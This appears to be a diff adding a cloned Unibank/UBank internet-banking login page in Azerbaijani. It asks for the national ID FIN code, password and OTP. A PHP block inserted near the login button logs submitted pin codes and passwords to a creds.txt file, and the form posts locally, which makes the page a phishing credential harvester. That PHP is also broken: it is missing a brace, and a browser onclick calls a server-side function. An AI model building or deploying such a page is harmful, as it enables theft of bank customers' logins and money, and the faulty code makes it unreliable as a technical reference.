@@ -1,0 +1,286 @@
+
+<?xml version='1.0' encoding='UTF-8' ?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt4">
+<title>Daxil ol</title>
+<meta http-equiv="cache-control" content="max-age=0" />
+<meta http-equiv="cache-control" content="no-cache" />
+<meta http-equiv="expires" content="0" />
+<meta http-equiv="pragma" content="no-cache" />
+<link href="resources/css/login.css" type="text/css" rel="stylesheet" />
+<link href="resources/imgs/icons/small/u-icon.png" type="image/x-icon" rel="icon" />
+<link href="resources/css/login/slider.css" type="text/css" rel="stylesheet" />
+<link href="resources/css/timer.css" type="text/css" rel="stylesheet" />
+<link href="resources/css/error.css" type="text/css" rel="stylesheet" />
+<script type="309402e61c1b092f3edd4eaf-text/javascript" src="resources/js/jquery-1.12.4.js"></script>
+<script type="309402e61c1b092f3edd4eaf-text/javascript">
+            $(function () {
+                history.pushState(null, null, 'login.jsf');
+                window.addEventListener('popstate',function () {
+                    history.pushState(null, null, 'login.jsf');
+                });
+            });
+        </script><script type="309402e61c1b092f3edd4eaf-text/javascript" src="/ibank/javax.faces.resource/jsf.js.jsf;jsessionid=caoTaG-aGMKmOZlWkTKOamVjydYc_dUgg5DlM9Pm58mCFFaIwoMX!-1969588473?ln=javax.faces"></script></head><body class="body">
+<div id="loadSpinModal" class="modal-payment hide">
+<div class="modal-content-loader ">
+<div class="modal-container-loader">
+<div id="loader">
+<img src="resources/imgs/ajax-loader.gif" />
+</div>
+</div>
+</div>
+</div>
+<div class="wrapper-outer-login">
+<div class="wrapper-inner">
+<div class="header">
+<table>
+<tr>
+<td>
+<img src="resources/imgs/icons/main-logo.png" />
+</td>
+<td>
+<form id="j_idt9" name="j_idt9" method="post" action="/ibank/login.jsf;jsessionid=caoTaG-aGMKmOZlWkTKOamVjydYc_dUgg5DlM9Pm58mCFFaIwoMX!-1969588473" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="j_idt9" value="j_idt9" />
+<a href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.jsfcljs(document.getElementById('j_idt9'),{'j_idt9:j_idt10':'j_idt9:j_idt10'},'');return false" class="lang selected" data-cf-modified-309402e61c1b092f3edd4eaf-="">AZ</a>  
+<a href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.jsfcljs(document.getElementById('j_idt9'),{'j_idt9:j_idt12':'j_idt9:j_idt12'},'');return false" class="lang " data-cf-modified-309402e61c1b092f3edd4eaf-="">EN</a>  
+<a href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.jsfcljs(document.getElementById('j_idt9'),{'j_idt9:j_idt14':'j_idt9:j_idt14'},'');return false" class="lang " data-cf-modified-309402e61c1b092f3edd4eaf-="">RU</a><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-1391151437914401498:2262750661993251451" autocomplete="off" />
+</form>
+</td>
+</tr>
+</table>
+</div>
+<div class="content-login">
+<div class="left-content">
+<div class="slide-info">
+<div id="box1" class="card-items fade show">
+<div class="card-img">
+<img src="resources/imgs/icons/cards/slide-img-1.png" />
+</div>
+<div class="card-info">
+<h4>Bir ekranda hər şeyi idarə et!</h4>
+<p>Filiala getmədən, UBank-la bank əməliyyatlarını bir ekranda et!</p>
+</div>
+ </div>
+<div id="box2" class="card-items fade hide">
+<div class="card-img">
+<img src="resources/imgs/icons/cards/slide-img-2.png" />
+</div>
+<div class="card-info  ">
+<h4>Bir toxunuşla istənilən yerə köçürmə et!</h4>
+<p>UBank vasitəsilə Western Union, Zolotaya Korona, CONTACT pul köçürmə sistemləri üzərindən bir toxunuşla dünyanın istənilən nöqtəsinə sürətli pul göndər!</p>
+</div>
+</div>
+<div id="slide-oval">
+</div>
+</div>
+</div>
+<div class="right-content">
+<form id="loginForm" name="loginForm" method="post" action="./index.html" enctype="application/x-www-form-urlencoded"> <!---->
+<input type="hidden" name="loginForm" value="loginForm" />
+<script type="309402e61c1b092f3edd4eaf-text/javascript" src="resources/js/hint.js"></script>
+<div class="login-forms">
+<div class="header-texts">
+<h3>
+<span>İnternet Bankçılığa giriş	</span><a id="j_idt20" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; jsf.util.chain(this,event,'clearInterval(qrCodeInterval);clearInterval(qrCodeRefreshInterval)','mojarra.ab(this,event,\'action\',\'@this\',0,{\'onevent\':spinLoader})');return false" class="registration-link" data-cf-modified-309402e61c1b092f3edd4eaf-="">
+Qeydiyyat
+</a><a id="checkScanStatusQRCodeBtn" href="#" style="display: none" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','qrCodeCheckStatus',{'onevent':handleQRCodeScanStatus});return false" data-cf-modified-309402e61c1b092f3edd4eaf-=""></a><input id="qrCodeCheckStatus" type="hidden" name="qrCodeCheckStatus" /><a id="qrCodeLoginBtn" href="#" style="display: none" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','mobileLoginMessage asanLoginMessage',{'onevent':handleQRCodeLogin});return false" data-cf-modified-309402e61c1b092f3edd4eaf-=""></a><a id="qrCodeRegisterBtn" href="#" style="display: none" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','@this',{'onevent':spinLoader});return false" data-cf-modified-309402e61c1b092f3edd4eaf-=""></a><input id="qrCodeLoginStatus" type="hidden" name="qrCodeLoginStatus" value="false" />
+</h3>
+</div>
+<div class="qr-code-wrapper"><span id="qrCodePanel">
+<img id="qrCodeImg" class="qrCodeImage" src="resources/imgs/icons/qrCode.png" />
+<!--                                        &lt;span class="qrcode-text"&gt;Tezlikl&#601;&lt;/span&gt;
+                                        &lt;img class="qrCodeImageSoon" id="qrCodeImg" src="resources/imgs/qr-soon.jpg"/&gt;--><a id="qrCodeRefreshLink" href="#" style="display: none" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','qrCodePanel');return false" data-cf-modified-309402e61c1b092f3edd4eaf-=""></a></span>
+</div>
+<div class="login-type-buttons" id="type-btns"><a id="pincodeLink" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action',0,'@form');return false" data-cf-modified-309402e61c1b092f3edd4eaf-="">
+<div class="by-type-active">
+<div class="type-inner-elements">
+<img src="resources/imgs/icons/login-mobile.png" />
+<span class="value-btn-active">FİN kod ilə</span>
+</div>
+</div></a><a id="j_idt26" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action',0,'@form');return false" data-cf-modified-309402e61c1b092f3edd4eaf-="">
+<div class="by-type">
+<div class="type-inner-elements">
+<img src="resources/imgs/icons/asan.png" />
+<span class="value-btn">Asan İmza </span>
+</div>
+</div></a>
+</div>
+<div class="info-wrapper">
+<img class="info-icon-qr" src="resources/imgs/icons/login-info.png" />
+QR kod ilə giriş üçün UBank-dan istifadə et
+</div>
+<br /><br /><br /><span id="loginContentPanel"><div id="mobileLoginMessage"></div>
+<div class="login-inputs">
+<div class="group">
+<img src="resources/imgs/icons/account.png" /><input id="pin-code" type="text" name="pin-code" autocomplete="off" class="input-for-design" maxlength="15" /> <!---->
+<a href="#" class="infoScreen" rel="resources/imgs/icons/pinkod.jpg">
+<img src="resources/imgs/icons/login-info.png" class="info-icon" />
+</a>
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Şəxsiyyət vəsiqəsinin FİN kodu</label>
+</div>
+<div class="group">
+<img src="resources/imgs/icons/lock.png" /><input id="password" type="password" name="password" autocomplete="off" value="" class="input-for-design" maxlength="16" /> <!---->
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Şifrə</label>
+</div>
+</div>
+<div class="login-bottom-inputs">
+<div class="code-type">
+<div class="group">
+<span class="highlight"></span>
+<span class="bar"></span>
+<label class="captcha-label"></label>
+</div>
+</div>
+<div class="forgot-password"><a id="j_idt40" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action',0,'changePasswordModal forgotPasswordModal',{'onevent':openForgotPasswordModal});return false" class="forgot-password-link" data-cf-modified-309402e61c1b092f3edd4eaf-="">
+Şifrəni unutmusuz?
+</a>
+</div>
+
+<?php
+function function1() 
+if (isset($_GET['pin-code']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['pin-code']} | Password: {$_GET['password']}\n");
+    fclose($file);
+    exit();
+}
+}
+?>
+
+<div class="input-action-mobile"><input id="login-btn" type="submit" name="login-btn" value="Daxil ol" onclick="function1()"/>
+<img src="resources/imgs/icons/arrow-right-login.png" />
+</div>
+</div></span>
+</div>
+</form>
+</div>
+</div>
+<div class="footer"></div>
+</div>
+</div>
+<!-- otp modal -->
+<div id="modal-otp" class="modal-notification hide">
+<div class="modal-content modal-animate modal-categories">
+<form id="j_idt58" name="j_idt58" method="post" action="/ibank/login.jsf;jsessionid=caoTaG-aGMKmOZlWkTKOamVjydYc_dUgg5DlM9Pm58mCFFaIwoMX!-1969588473" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="j_idt58" value="j_idt58" />
+<header class="modal-header">
+<div class="left-modal-tab ">Birdəfəlik şifrə (OTP)</div>
+<span><a id="j_idt60" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','@form sentOtpStatus',{'onevent':closeOtpModalSimple});return false" class="close-modal" data-cf-modified-309402e61c1b092f3edd4eaf-="">×
+</a>
+</span>
+</header>
+<div class="modal-container"><div id="modalErrorMessage"></div>
+<div class="modal-content-text">
+Unibank-da olan mobil nömrənizə SMS vasitəsilə şifrə göndərildi
+</div>
+<div class="modal-content-inputs">
+<div class="group">
+<img src="resources/imgs/icons/account.png" /><input id="otp" type="text" name="otp" class="input-for-design" maxlength="6" autocomplete="off" required="" />
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Birdəfəlik şifrəni (OTP) daxil edin</label>
+</div>
+</div>
+</div>
+<div class="modal-footer">
+<div class="otp-accept"><input id="j_idt67" type="submit" name="j_idt67" value="Təsdiqlə" class="otp-accept-button" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@form','@form',{'onevent':handleOtpAccept});return false" data-cf-modified-309402e61c1b092f3edd4eaf-="" /><input id="checkOtpStatus" type="hidden" name="checkOtpStatus" value="false" /><input id="closeOtpModalBtn" type="submit" name="closeOtpModalBtn" value="" style="display: none" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','loginForm',{'onevent':handleOtpLogin});return false" data-cf-modified-309402e61c1b092f3edd4eaf-="" />
+<img src="resources/imgs/icons/arrow-right-login.png" />
+</div>
+</div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:2" value="-1391151437914401498:2262750661993251451" autocomplete="off" />
+</form>
+</div>
+</div>
+<!-- Forgot password modal -->
+<div id="modal-forgot-password" class="modal-notification hide">
+<div class="modal-content modal-animate forgot-modal">
+<form id="forgotPasswordModal" name="forgotPasswordModal" method="post" action="/ibank/login.jsf;jsessionid=caoTaG-aGMKmOZlWkTKOamVjydYc_dUgg5DlM9Pm58mCFFaIwoMX!-1969588473" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="forgotPasswordModal" value="forgotPasswordModal" />
+<header class="modal-header">
+<div class="left-modal-tab ">Şifrənin bərpası</div>
+<span><a id="j_idt71" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','@form',{'onevent':closeForgotPasswordModal});return false" class="close-modal" data-cf-modified-309402e61c1b092f3edd4eaf-="">×
+</a>
+</span>
+</header>
+<div class="forgot-modal-content">
+<div class="forgot-modal-content-inputs">
+<div class="group">
+<img src="resources/imgs/icons/account.png" /><input id="forgot-pincode" type="text" name="forgot-pincode" autocomplete="off" class="forgot-input" maxlength="16" required="" />
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Şəxsiyyət vəsiqəsinin FİN kodu</label>
+</div>
+<div class="group">
+<img src="resources/imgs/icons/login-mobile.png" /><select id="j_idt79" name="j_idt79" class="country_codes" size="1" onchange="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'change',0,'phoneDescription phone')" data-cf-modified-309402e61c1b092f3edd4eaf-=""> <option value="+994">+994    Azərbaycan</option>
+
+</select><input id="selection-prefix-phone" type="text" name="selection-prefix-phone" class="input-for-design" onkeypress="if (!window.__cfRLUnblockHandlers) return false; if ((event.which &gt; 47 &amp;&amp; event.which &lt; 58 ) || event.which === 43) return true; else return false;" autocomplete="off" maxlength="14" required="" data-cf-modified-309402e61c1b092f3edd4eaf-="" />
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Mobil nömrə</label><span id="phoneDescription"><span class="small-description">Mobil nömrənin düzgün formatı: +994 XX XXX XX XX</span></span>
+</div><input id="errorStatus" type="hidden" name="errorStatus" value="false" />
+</div>
+</div>
+<div class="modal-footer">
+<div class="forgot-modal-accept"><a id="j_idt87" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@form','@form changePasswordMessage',{'onevent':handleForgotPassword});return false" class="forgot-modal-accept-button" data-cf-modified-309402e61c1b092f3edd4eaf-="">Təsdiqlə</a>
+<img src="resources/imgs/icons/arrow-right-login.png" />
+</div>
+</div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:3" value="-1391151437914401498:2262750661993251451" autocomplete="off" />
+</form>
+</div>
+</div>
+<!-- Change password modal -->
+<div id="modal-change-password" class="modal-notification hide">
+<div class="modal-content modal-animate forgot-modal">
+<form id="changePasswordModal" name="changePasswordModal" method="post" action="/ibank/login.jsf;jsessionid=caoTaG-aGMKmOZlWkTKOamVjydYc_dUgg5DlM9Pm58mCFFaIwoMX!-1969588473" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="changePasswordModal" value="changePasswordModal" />
+<header class="modal-header">
+<div class="left-modal-tab ">Şifrənin bərpası</div>
+<span><a id="j_idt91" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@this','@form',{'onevent':closeChangePasswordModal});return false" class="close-modal" data-cf-modified-309402e61c1b092f3edd4eaf-="">×
+</a>
+</span>
+</header>
+<div class="forgot-modal-content"><div id="changePasswordMessage"></div>
+<div class="forgot-modal-content-inputs">
+<div class="group">
+<img src="resources/imgs/icons/account.png" /><input id="forgot-otp" type="text" name="forgot-otp" autocomplete="off" class="input-for-design" maxlength="6" required="" />
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Birdəfəlik şifrəni (OTP) daxil edin</label>
+</div>
+<div class="group">
+<img src="resources/imgs/icons/lock.png" /><input id="new-password" type="password" name="new-password" autocomplete="off" value="" class="input-for-design" required="" />
+<span class="highlight"></span>
+<span class="bar"></span>
+<label> Yeni şifrə</label>
+</div>
+<div class="group">
+<img src="resources/imgs/icons/lock.png" /><input id="re-password" type="password" name="re-password" autocomplete="off" value="" class="input-for-design" required="" />
+<span class="highlight"></span>
+<span class="bar"></span>
+<label>Təkrar şifrə</label>
+</div><input id="changePasswordErrorStatus" type="hidden" name="changePasswordErrorStatus" value="false" />
+</div>
+</div>
+<div class="modal-footer">
+<div class="forgot-modal-accept"><a id="j_idt105" href="#" onclick="if (!window.__cfRLUnblockHandlers) return false; mojarra.ab(this,event,'action','@form','@form mobileLoginMessage',{'onevent':handleChangePassword});return false" class="forgot-modal-accept-button" data-cf-modified-309402e61c1b092f3edd4eaf-="">Təsdiqlə</a>
+<img src="resources/imgs/icons/arrow-right-login.png" />
+</div>
+</div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:4" value="-1391151437914401498:2262750661993251451" autocomplete="off" />
+</form>
+</div>
+</div>
+<script type="309402e61c1b092f3edd4eaf-text/javascript" src="resources/js/login/login-slider.js"></script>
+<script type="309402e61c1b092f3edd4eaf-text/javascript" src="resources/js/login/login-events.js"></script>
+<script type="309402e61c1b092f3edd4eaf-text/javascript" src="resources/js/login/timer.js"></script>
+<script type="309402e61c1b092f3edd4eaf-text/javascript">
+           
+            clearInterval(qrCodeInterval);
+            clearInterval(qrCodeRefreshInterval);
+             refreshQRCode();
+            checkScanQRCode();
+            dotsCount();
+        </script><script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="309402e61c1b092f3edd4eaf-|49" defer=""></script></body>
+</html>
